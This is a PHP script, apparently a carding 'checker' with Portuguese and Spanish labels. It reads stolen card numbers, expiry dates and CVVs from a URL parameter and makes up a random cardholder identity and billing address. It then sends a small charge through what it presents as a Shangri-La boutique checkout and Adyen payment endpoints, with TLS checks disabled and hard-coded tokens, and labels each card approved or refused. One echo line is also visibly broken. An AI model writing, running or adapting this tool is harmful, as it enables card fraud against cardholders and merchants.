<?php
ignore_user_abort();
error_reporting(0);
session_start();
$time = time();

function multiexplode($delimiters, $string) {
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}
function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
function replace_unicode_escape_sequence($match) { return mb_convert_encoding(pack('H*', $match[1]), 'UTF-8', 'UCS-2BE'); }
function unicode_decode($str) { return preg_replace_callback('/\\\\u([0-9a-f]{4})/i', 'replace_unicode_escape_sequence', $str);}
$delemitador = array("|", ";", ":", "/", "»", "«", ">", "<");

$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
die('<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">Lista inválida...</span> ➔ <span class="badge badge-warning">Suporte: @pladixoficial</span><br>');
}

$lista = $_GET['lista'];
$cc = multiexplode($delemitador, $lista)[0];
$mes = multiexplode($delemitador, $lista)[1];
$ano = multiexplode($delemitador, $lista)[2];
$cvv = multiexplode($delemitador, $lista)[3];

if (strlen($mes) == 1){
  $mes = "0$mes";
}

if (strlen($ano) == 2){
  $ano = "20$ano";
}

if (strlen($ano) == 4){
  $ano2 = substr($ano, 2);
}

if ($mes == 1) {
  $mes2 = "1";
}elseif ($mes == 2) {
  $mes2 = "2";
}elseif ($mes == 3) {
  $mes2 = "3";
}elseif ($mes == 4) {
  $mes2 = "4";
}elseif ($mes == 5) {
  $mes2 = "5";
}elseif ($mes == 6) {
  $mes2 = "6";
}elseif ($mes == 7) {
  $mes2 = "7";
}elseif ($mes == 8) {
  $mes2 = "8";
}elseif ($mes == 9) {
  $mes2 = "9";
}elseif ($mes == 10) {
  $mes2 = "10";
}elseif ($mes == 11) {
  $mes2 = "11";
}elseif ($mes == 12) {
  $mes2 = "12";
}

$re = array(
  "Visa" => "/^4[0-9]{12}(?:[0-9]{3})?$/",
  "Master" => "/^5[1-5]\d{14}$/",
  "Amex" => "/^3[47]\d{13,14}$/",
  "Elo" => "/^((((636368)|(438935)|(504175)|(650905)|(451416)|(636297))\d{0,10})|((5067)|(4576)|(6550)|(6516)|(6504)||(6509)|(4011))\d{0,12})$/",
  "hipercard" => "/^(606282\d{10}(\d{3})?)|(3841\d{15})$/",
);
if (preg_match($re['Visa'], $cc)) {
   $tipo = "Visa";
} else if (preg_match($re['Amex'], $cc)) {
    $tipo = "Amex";
} else if (preg_match($re['Master'], $cc)) {
   $tipo = "Master";
} else if (preg_match($re['Elo'], $cc)) {
   $tipo = "Elo";
} 
else if (preg_match($re['hipercard'], $cc)) {
  $tipo = "Hipercard";
} 
else {
  echo "Reprovada $cc|$mes|$ano|$cvv -> Cartão não suportado.";
    die();
}

$nomes = array('Christo','Ryan','Ethan','John','Zoey','Sarah','Pedro','Lucas','Alex','Ana','Renan','Ronald','Isaias','Moises','Midas','Antonio','Nadia','Ellen','Elen','Gustav','Marcos','Marco','Marcio','Leonardo','Gabriel','Karen','Karina','Bener','Michel','Sandra'
);
$sobrenomes = array('Walker','Thompson','Anderson','Johnson','Trembay','Peltier','Soares','Souza','Esquilo','Bila','Rosa','Auto','Ferraz','Alone','Batis','Libra','Aquario','Escorp','Zula','Leao','Leal','Leau','Jonga','Tabat','Tornet','Vrous','Vrau','Fruis','Foises','Noses','Nugra','Tundra','Tomper','Isais','Color','Toro','Taroe','Pereira','Simpson','Mercado','Sellers'
);
$name = $nomes[mt_rand(0, sizeof($nomes) - 1)];
$sobre = $sobrenomes[mt_rand(0, sizeof($sobrenomes) - 1)];
$nomeesobre = "$name $sobre";

$centavos = array('00','05','10','15','20','25','30','35','40','45','50','55','60','65','70','75','80','85','90','99');
$centavos = $centavos[mt_rand(0, sizeof($centavos) - 1)];

/* ===>>> SHANGRI-LA BOUTIQUE EXPRESS <<<=== */

// CONFIGURACIÓN CONFIRMADA
$client_id = "14";
$promotion_id = "1";
$api_endpoint = "https://boutique.shangri-la.com/sleb_api/api";
$api_locale = "en";
$adyen_version = "_0_1_25";
$adyen_key = "10001|EA9DDE733BC69B0DF0AA6AAB6CAC1A8EE7D2D5BA830C670D2EABF9133B098A88BE1F8ABBDD999BA3A5B36465941FE09D95A4A9A1A53C815583DA1932C926B5C8F4023A183CEF755DE196D2FA9474F97DB47B4647A45D35AB9198EC492006C999680E0592005F1C1400B041ECE0282FF58BCD66DFA4B98CC262E0A450DD623FB57A4F2C05A624958F02F4D764FAE903362EC07457A970F9F64512AA8DC6008CEC94C1A675F6432BC1070BCB311462FB52EC23B3FE568A7D7B154506C91544671A43729520C448698CF590A6682F2BB4BDC95B9267361266A57EC68EC0830AD6ECDCC3447C049578787601685B98926471BE6F5BF1E8A1E97FD13009844A0B82E7";
$return_url = "https://boutique.shangri-la.com/adyen_card_redirect.php";
$hotel_code = "ISL";

// TOKEN ACTUAL
$site_login_token = "beQDmTL1oVRPZmOLWQdnFXCtRC4Eu5M81h3KtAiWIM0VMTki7RXw9RPrFlXLhoP42a5YNETYAcPVdmv8";

echo "<style>
.badge { padding: 5px 10px; border-radius: 4px; font-weight: bold; }
.badge-success { background: #28a745; color: white; }
.badge-danger { background: #dc3545; color: white; }
.badge-warning { background: #ffc107; color: black; }
.badge-info { background: #17a2b8; color: white; }
.response-box { background: #f8f9fa; border: 1px solid #ddd; padding: 10px; margin: 10px 0; border-radius: 5px; }
</style>";

echo "<h3>🔐 SHANGRI-LA EXPRESS CHECKOUT</h3>";
echo "Card: <strong>$cc|$mes|$ano|$cvv</strong> ($tipo)<br>";
echo "Token: " . substr($site_login_token, 0, 20) . "...<br>";
echo "Hotel: $hotel_code (Island Shangri-La)<br>";
echo "Return URL: $return_url<br><br>";

// PASO 1: OBTENER DATOS DE CHECKOUT (crear orden)
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $api_endpoint . "/checkout_init.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Accept: application/json",
    "Content-Type: application/json",
    "Referer: https://boutique.shangri-la.com/food_checkout.php",
    "Origin: https://boutique.shangri-la.com"
));
curl_setopt($ch, CURLOPT_POST, 1);

$init_data = array(
    "client_id" => $client_id,
    "promotion_id" => $promotion_id,
    "lang" => $api_locale,
    "site_login_token" => $site_login_token,
    "user_id" => "",
    "login_token" => "",
    "hotel_code" => $hotel_code,
    "return_url" => $return_url,
    "order_amount" => 100, // Monto mínimo en centavos (HKD 1.00)
    "payment_method" => "adyen"
);

curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($init_data));
$init_response = curl_exec($ch);
$init_httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

echo "<div class='response-box'>";
echo "<strong>📦 CHECKOUT INIT:</strong><br>";
echo "HTTP: $init_httpcode<br>";
echo "Response: " . htmlspecialchars($init_response) . "<br>";
echo "</div>";

if ($init_httpcode == 200) {
    $init_result = json_decode($init_response, true);
    
    if (isset($init_result['order_number']) && isset($init_result['order_token'])) {
        $order_number = $init_result['order_number'];
        $order_token = $init_result['order_token'];
        $order_amount = isset($init_result['order_amount']) ? $init_result['order_amount'] : 100;
        
        echo "<div class='response-box' style='background:#d1ecf1;'>";
        echo "✅ <strong>ORDEN CREADA</strong><br>";
        echo "Order: <strong>$order_number</strong><br>";
        echo "Token: " . substr($order_token, 0, 20) . "...<br>";
        echo "Amount: HKD " . number_format($order_amount/100, 2) . "<br>";
        echo "</div>";
        
        // PASO 2: ENCRIPTAR TARJETA
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_endpoint . "/adyen_encrypt.php");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "Accept: application/json",
            "Content-Type: application/json",
            "Referer: https://boutique.shangri-la.com/food_checkout.php",
            "Origin: https://boutique.shangri-la.com"
        ));
        curl_setopt($ch, CURLOPT_POST, 1);

        $encrypt_data = array(
            "client_id" => $client_id,
            "promotion_id" => $promotion_id,
            "lang" => $api_locale,
            "site_login_token" => $site_login_token,
            "order_number" => $order_number,
            "order_token" => $order_token,
            "card" => $cc,
            "month" => $mes2,
            "year" => $ano,
            "cvv" => $cvv,
            "adyen_key" => $adyen_key,
            "adyen_version" => $adyen_version
        );

        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($encrypt_data));
        $encrypted_response = curl_exec($ch);
        $encrypt_httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        echo "<div class='response-box'>";
        echo "<strong>🔐 ADYEN ENCRYPT:</strong><br>";
        echo "HTTP: $encrypt_httpcode<br>";
        echo "Response: " . htmlspecialchars($encrypted_response) . "<br>";
        echo "</div>";

        if ($encrypt_httpcode == 200) {
            $encrypted_data = json_decode($encrypted_response, true);
            
            if (isset($encrypted_data['encryptedCardNumber'])) {
                $encryptedCardNumber = $encrypted_data['encryptedCardNumber'];
                $encryptedExpiryMonth = $encrypted_data['encryptedExpiryMonth'];
                $encryptedExpiryYear = $encrypted_data['encryptedExpiryYear'];
                $encryptedSecurityCode = $encrypted_data['encryptedSecurityCode'];
                
                echo "<div class='response-box' style='background:#d4edda;'>";
                echo "✅ <strong>ENCRYPT SUCCESS</strong><br>";
                echo "Card: " . substr($encryptedCardNumber, 0, 50) . "...<br>";
                echo "</div>";
                
                // PASO 3: PROCESAR PAGO
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $api_endpoint . "/adyen_process.php");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                    "Accept: application/json",
                    "Content-Type: application/json",
                    "Referer: https://boutique.shangri-la.com/food_checkout.php",
                    "Origin: https://boutique.shangri-la.com"
                ));
                curl_setopt($ch, CURLOPT_POST, 1);
                
                $process_data = array(
                    "client_id" => $client_id,
                    "promotion_id" => $promotion_id,
                    "lang" => $api_locale,
                    "site_login_token" => $site_login_token,
                    "order_number" => $order_number,
                    "order_token" => $order_token,
                    "hotel_code" => $hotel_code,
                    "encryptedCardNumber" => $encryptedCardNumber,
                    "encryptedExpiryMonth" => $encryptedExpiryMonth,
                    "encryptedExpiryYear" => $encryptedExpiryYear,
                    "encryptedSecurityCode" => $encryptedSecurityCode,
                    "amount" => array(
                        "value" => $order_amount,
                        "currency" => "HKD"
                    ),
                    "return_url" => $return_url,
                    "payment_method" => "adyen",
                    "card_type" => $tipo,
                    "billing_address" => array(
                        "firstName" => $name,
                        "lastName" => $sobre,
                        "email" => strtolower($name) . "." . strtolower($sobre) . "@gmail.com",
                        "phone" => "+852" . mt_rand(50000000, 99999999),
                        "address" => array(
                            "street" => "Flat 12B, Tower 1",
                            "houseNumberOrName" => "The Arch",
                            "city" => "Hong Kong",
                            "postalCode" => "000000",
                            "country" => "HK"
                        )
                    )
                );
                
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($process_data));
                $process_response = curl_exec($ch);
                $process_httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);
                
                echo "<div class='response-box'>";
                echo "<strong>💳 ADYEN PROCESS:</strong><br>";
                echo "HTTP: $process_httpcode<br>";
                echo "Response: " . htmlspecialchars($process_response) . "<br>";
                echo "</div>";
                
                // RESULTADO FINAL
                $process_result = json_decode($process_response, true);
                
                if ($process_httpcode == 200) {
                    if (isset($process_result['resultCode'])) {
                        switch($process_result['resultCode']) {
                            case 'Authorised':
                                echo '<span class="badge badge-success">✅ APROVADA</span> ➔ ';
                                echo '<span class="badge badge-success">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ';
                                echo '<span class="badge badge-info">' . $tipo . '</span> ➔ ';
                                echo '<span class="badge badge-warning">SHANGRI-LA EXPRESS</span><br>';
                                
                                echo '<div class="response-box" style="background:#d4edda;">';
                                echo '<strong>💰 PAGO AUTORIZADO</strong><br>';
                                echo 'Order: <strong>' . $order_number . '</strong><br>';
                                echo 'Auth Code: ' . (isset($process_result['authCode']) ? $process_result['authCode'] : 'N/A') . '<br>';
                                echo 'Amount: HKD <strong>' . number_format($order_amount/100, 2) . '</strong><br>';
                                echo 'PSP Reference: ' . (isset($process_result['pspReference']) ? $process_result['pspReference'] : 'N/A') . '<br>';
                                
                                if (isset($process_result['additionalData']) && isset($process_result['additionalData']['cardSummary'])) {
                                    echo 'Card: ****' . $process_result['additionalData']['cardSummary'] . '<br>';
                                }
                                echo '</div>';
                                break;
                                
                            case 'Refused':
                                echo '<span class="badge badge-danger">❌ REPROVADA</span> ➔ ';
                                echo '<span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ';
                                echo '<span class="badge badge-info">' . $tipo . '</span> ➔ ';
                                echo '<span class="badge badge-warning">SHANGRI-LA EXPRESS</span><br>';
                                
                                echo '<div class="response-box" style="background:#f8d7da;">';
                                echo '<strong>❌ PAGO RECHAZADO</strong><br>';
                                echo 'Reason: ' . (isset($process_result['refusalReason']) ? $process_result['refusalReason'] : 'Unknown') . '<br>';
                                echo 'Order: ' . $order_number . '<br>';
                                echo '</div>';
                                break;
                                
                            case 'Error':
                            case 'Cancelled':
                                echo '<span class="badge badge-warning">⚠️ ERROR</span> ➔ ';
                                echo '<span class="badge badge-warning">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ';
                                echo '<span class="badge badge-info">' . $tipo . '</span> ➔ ';
                                echo '<span class="badge badge-warning">SHANGRI-LA EXPRESS</span><br>';
                                
                                echo '<div class="response-box" style="background:#fff3cd;">';
                                echo '<strong>⚠️ ERROR EN PROCESO</strong><br>';
                                echo 'Result: ' . $process_result['resultCode'] . '<br>';
                                echo 'Message: ' . (isset($process_result['refusalReason']) ? $process_result['refusalReason'] : 'Check response') . '<br>';
                                echo '</div>';
                                break;
                                
                            default:
                                echo '<span class="badge badge-warning">⚠️ REVISAR</span> ➔ ';
                                echo '<span class="badge badge-warning">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ';
                                echo '<span class="badge badge-info">' . $tipo . '</span> ➔ ';
                                echo '<span class="badge badge-warning">SHANGRI-LA EXPRESS</span><br>';
                                
                                echo '<div class="response-box">';
                                echo '<strong>📄 RESPUESTA COMPLETA:</strong><br>';
                                echo '<pre>' . htmlspecialchars(print_r($process_result, true)) . '</pre>';
                                echo '</div>';
                        }
                    } elseif (isset($process_result['action'])) {
                        // Redirección 3D Secure
                        echo '<span class="badge badge-info">🔄 3D SECURE</span> ➔ ';
                        echo '<span class="badge badge-success">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ';
                        echo '<span class="badge badge-info">' . $tipo . '</span> ➔ ';
                        echo '<span class="badge badge-warning">SHANGRI-LA EXPRESS</span><br>';
                        
                        echo '<div class="response-box" style="background:#cce5ff;">';
                        echo '<strong>🔐 3D SECURE REQUERIDO</strong><br>';
                        echo 'Order: ' . $order_number . '<br>';
                        echo 'Action URL: ' . (isset($process_result['action']['url']) ? $process_result['action']['url'] : 'N/A') . '<br>';
                        echo 'Method: ' . (isset($process_result['action']['method']) ? $process_result['action']['method'] : 'N/A') . '<br>';
                        echo '</div>';
                        
                        // Mostrar formulario para 3DS
                        if (isset($process_result['action']['method']) && $process_result['action']['method'] == 'POST') {
                            echo '<form id="tdsForm" action="' . $process_result['action']['url'] . '" method="post">';
                            foreach($process_result['action']['fields'] as $key => $value) {
                                echo '<input type="hidden" name="' . $key . '" value="' . $value . '">';
                            }
                            echo '<button type="submit" style="background:#007bff;color:white;padding:10px 20px;border:none;border-radius:5px;cursor:pointer;">';
                            echo '🔒 Proceder con 3D Secure';
                            echo '</button>';
                            echo '</form>';
                        }
                    } else {
                        echo '<span class="badge badge-danger">❌ ERROR</span> ➔ ';
                        echo '<span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ';
                        echo '<span class="badge badge-info">' . $tipo . '</span><br>';
                        echo 'Response: ' . htmlspecialchars($process_response) . '<br>';
                    }
                } else {
                    echo '<span class="badge badge-danger">❌ HTTP ERROR</span> ➔ ';
                    echo '<span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ';
                    echo '<span class="badge badge-info">' . $tipo . '</span> ➔ ';
                    echo '<span class="badge badge-warning">HTTP ' . $process_httpcode . '</span><br>';
                }
            } else {
                echo '<span class="badge badge-danger">❌ ENCRYPT FAIL</span> ➔ ';
                echo '<span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ';
                echo '<span class="badge badge-info">' . $tipo . '</span><br>';
                echo 'Encrypt Response: ' . htmlspecialchars($encrypted_response) . '<br>';
            }
        } else {
            echo '<span class="badge badge-danger">❌ ENCRYPT ERROR</span> ➔ ';
            echo '<span class="badge badge-danger">' . $cc . '|$mes|$ano|$cvv . '</span> ➔ ';
            echo '<span class="badge badge-info">' . $tipo . '</span> ➔ ';
            echo '<span class="badge badge-warning">HTTP ' . $encrypt_httpcode . '</span><br>';
        }
    } else {
        echo '<span class="badge badge-danger">❌ ORDER FAIL</span> ➔ ';
        echo '<span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ';
        echo '<span class="badge badge-info">' . $tipo . '</span><br>';
        echo 'Init Response: ' . htmlspecialchars($init_response) . '<br>';
    }
} else {
    echo '<span class="badge badge-danger">❌ INIT ERROR</span> ➔ ';
    echo '<span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ';
    echo '<span class="badge badge-info">' . $tipo . '</span> ➔ ';
    echo '<span class="badge badge-warning">HTTP ' . $init_httpcode . '</span><br>';
}

/* ===>>> SHANGRI-LA BOUTIQUE EXPRESS <<<=== */
?>